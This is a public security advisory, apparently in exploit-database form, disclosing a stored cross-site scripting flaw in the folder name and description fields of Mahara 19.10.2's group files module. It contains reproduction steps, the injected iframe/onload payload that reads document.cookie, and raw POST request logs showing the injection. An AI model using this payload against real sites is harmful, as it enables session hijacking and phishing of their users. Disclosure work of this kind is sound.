@@ -1,0 +1,248 @@
+# Title: Mahara 19.10.2 CMS - Persistent Cross-Site Scripting
+# Author: Vulnerability Laboratory
+# Date: 2020-04-21
+# Vendor: https://mahara.org
+# Software Link: https://launchpad.net/mahara
+# CVE: N/A
+
+Document Title:
+===============
+Mahara v19.10.2 CMS - Persistent Cross Site Vulnerability
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2217
+
+Release Date:
+=============
+2020-04-21
+
+Common Vulnerability Scoring System:
+====================================
+4.3
+
+Affected Product(s):
+====================
+Catalyst IT Ltd.
+Product: Mahara v19.10.2 - CMS (Web-Application)
+https://launchpad.net/mahara & https://mahara.org
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-21: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+A persistent input validation web vulnerability has been discovered in
+the official Mahara v19.10.2 CMS web-application series.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise browser
+to web-application requests from the application-side.
+
+The persistent vulnerability is located in the `nombre` and
+`descripción` parameters of the `Ficheros` module in the
+`groupfiles.php` file.
+Remote attackers with low privileges are able to inject own malicious
+persistent script code as files and foldernames. The injected code can
+be used to attack the frontend or backend of the web-application. The
+request method to inject is POST and the attack vector is located on
+the application-side. Files are able to be reviewed in the backend by
+higher privileged accounts and can be shared.
+
+Successful exploitation of the vulnerabilities results in session
+hijacking, persistent phishing attacks, persistent external redirects to
+malicious source and persistent manipulation of affected application
+modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] Ficheros (Files Manager)
+
+Vulnerable Input(s):
+[+] Crear Carpeta
+
+Vulnerable File(s):
+[+] groupfiles.php
+
+
+Vulnerable Parameter(s):
+[+] nombre
+[+] descripción
+
+Affected Module(s):
+[+] Página principal
+
+
+Proof of Concept (PoC):
+=======================
+The persistent web vulnerability can be exploited by low privileged web
+application user account with low user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+Manual steps to reproduce ...
+1. Open the web-application and login as regular user
+2. Move inside the mygroup management
+3. Open the ficheros tab on top
+4. Inject test payload into the crear carpeta (Nombre & Descripción)
+input field for the página principal to output
+Note: The execution point occurs on edit, list and delete interaction
+5. The created path listings are available for higher privileged user
+account that review (Backend)
+6. Successul reproduce of the persistent cross site web vulnerability!
+
+
+PoC: Vulnerable Source (Inject via Crear Carpeta Input for Página Principal)
+<tr id="file:7191" class="file-item folder no-hover ui-droppable">
+<td class="icon-cell">
+<div class="icon-drag ui-draggable ui-draggable-handle" id="drag:7191"
+tabindex="0">
+<span class="sr-only">Seleccionar y arrastrar para mover >"<iframe
+src=evil.source onload=alert(document.cookie)></iframe>
+>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe></span>
+<span class="icon-folder-open icon icon-lg " role="presentation"
+aria-hidden="true"></span>
+</div></td>
+<td class="filename">
+<a
+href="https://mahara_cms.localhost:8080/artefact/file/groupfiles.php?group=27&folder=7191&owner=group&ownerid=27"
+
+id="changefolder:7191" class="inner-link changefolder">
+<span class="sr-only">Carpeta:</span>
+<span class="display-title ">>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>
+>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe></span>
+</a></td>
+<td class="filedescription d-none d-md-table-cell">
+>"<iframe></iframe>     >"<iframe></iframe></td>
+<td class="filesize"></td>
+<td class="filedate">20/04/2020</td>
+<!-- Ensure space for 3 buttons (in the case of a really long single
+line string in a user input field -->
+<td class="text-right control-buttons ">
+<div class="btn-group">
+...	...
+<button name="files_filebrowser_edit[7191]" class="btn btn-secondary
+btn-sm">
+<span class="icon icon-pencil-alt icon-lg" role="presentation"
+aria-hidden="true"></span>
+<span class="sr-only">Edit folder ">"<iframe
+src=evil.source
+onload=alert(document.cookie)></iframe>
+>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>"</span></button>
+<button name="files_filebrowser_delete[7191]" class="btn btn-secondary
+btn-sm">
+<span class="icon icon-trash-alt text-danger icon-lg"
+role="presentation" aria-hidden="true"></span>
+<span class="sr-only">Delete folder ">"<iframe
+src=evil.source
+onload=alert(document.cookie)></iframe>
+>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>"</span>
+</button></div></td>
+
+
+--- PoC Session Logs [POST] --- (Mygroup Ficheros)
+https://mahara_cms.localhost:8080/artefact/file/groupfiles.php?group=27&folder=0&owner=group&ownerid=27
+Host: mahara_cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data;
+boundary=---------------------------98107146915324237501974151621
+Content-Length: 4879
+Origin: https://mahara_cms.localhost:8080
+Connection: keep-alive
+Referer:
+https://mahara_cms.localhost:8080/artefact/file/groupfiles.php?group=27&folder=0&owner=group&ownerid=27
+Cookie: __cfduid=d6b9845d834027b2fd8a2223c5b559f2f1587303558;
+mahara=82af10d7e4d0a63e1395d579d0d2f4ea8fb16a18b0e97378b0473c0cf32d1b76;
+folder=0&files_filebrowser_changefolder=&files_filebrowser_foldername=Página
+principal&files_filebrowser_uploadnumber=1&files_filebrowser_upload=0&MAX_FILE_SIZE=1610608640&files_filebrowser_license=&
+files_filebrowser_license_other=&files_filebrowser_licensor=&files_filebrowser_licensorurl=&files_filebrowser_resizeonuploaduserenable=on&userfile[]=&files_filebrowser_move=&files_filebrowser_moveto=&files_filebrowser_createfolder_name=&files_filebrowser_edit_orientation=0&
+files_filebrowser_edit_title=>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>    >"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>&files_filebrowser_edit_description=>"<iframe
+src=evil.source onload=alert(document.cookie)></iframe>
+>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>&files_filebrowser_permission:member:view=on&files_filebrowser_permission:member:edit=on&
+files_filebrowser_permission:member:republish=on&files_filebrowser_edit_license=&files_filebrowser_edit_license_other=&
+files_filebrowser_edit_licensor=>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>   >"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>&files_filebrowser_edit_licensorurl=>"<iframe
+src=evil.source onload=alert(document.cookie)></iframe>
+>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>&files_filebrowser_edit_allowcomments=on&
+files_filebrowser_update[7191]=Guardar
+cambios&sesskey=pFJC0a1dZWsy8rEA&pieform_files=&pieform_jssubmission=1,1,1
+-
+POST: HTTP/2.0 200 OK
+content-type: text/html; charset=UTF-8
+vary: Accept-Encoding
+cache-control: no-store, no-cache, must-revalidate
+set-cookie:
+mahara=82af10d7e4d0a63e1395d579d0d2f4ea8fb16a18b0e97378b0473c0cf32d1b76;
+path=/; secure; HttpOnly
+content-encoding: br
+X-Firefox-Spdy: h2-
+https://mahara_cms.localhost:8080/artefact/file/groupfiles.php?group=27&folder=0&owner=group&ownerid=
+-
+Host: mahara_cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data;
+boundary=---------------------------126319663526561351602937008964
+Content-Length: 3721
+Origin: https://mahara_cms.localhost:8080
+Connection: keep-alive
+Referer:
+https://mahara_cms.localhost:8080/artefact/file/groupfiles.php?group=27&folder=0&owner=group&ownerid=
+Cookie: __cfduid=d6b9845d834027b2fd8a2223c5b559f2f1587303558;
+mahara=82af10d7e4d0a63e1395d579d0d2f4ea8fb16a18b0e97378b0473c0cf32d1b76;
+folder=0&files_filebrowser_changefolder=&files_filebrowser_foldername=Página
+principal&files_filebrowser_uploadnumber=1&files_filebrowser_upload=0&MAX_FILE_SIZE=1610608640&files_filebrowser_license=&
+files_filebrowser_license_other=&files_filebrowser_licensor=&files_filebrowser_licensorurl=&files_filebrowser_resizeonuploaduserenable=on&userfile[]=&files_filebrowser_move=&files_filebrowser_moveto=&files_filebrowser_createfolder_name=&files_filebrowser_delete[7192]=&files_filebrowser_edit_orientation=0&files_filebrowser_edit_title=&files_filebrowser_edit_description=&files_filebrowser_edit_license=&
+files_filebrowser_edit_license_other=&files_filebrowser_edit_licensor=&files_filebrowser_edit_licensorurl=&
+sesskey=pFJC0a1dZWsy8rEA&pieform_files=&pieform_jssubmission=1,1
+-
+GET: HTTP/2.0 200 OK
+content-type: text/html; charset=UTF-8
+vary: Accept-Encoding
+cache-control: no-store, no-cache, must-revalidate
+set-cookie:
+mahara=82af10d7e4d0a63e1395d579d0d2f4ea8fb16a18b0e97378b0473c0cf32d1b76;
+path=/; secure; HttpOnly
+content-encoding: br
+X-Firefox-Spdy: h2
+
+
+Reference(s):
+https://mahara_cms.localhost:8080/artefact/
+https://mahara_cms.localhost:8080/artefact/file/
+https://mahara_cms.localhost:8080/artefact/file/groupfiles.php
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
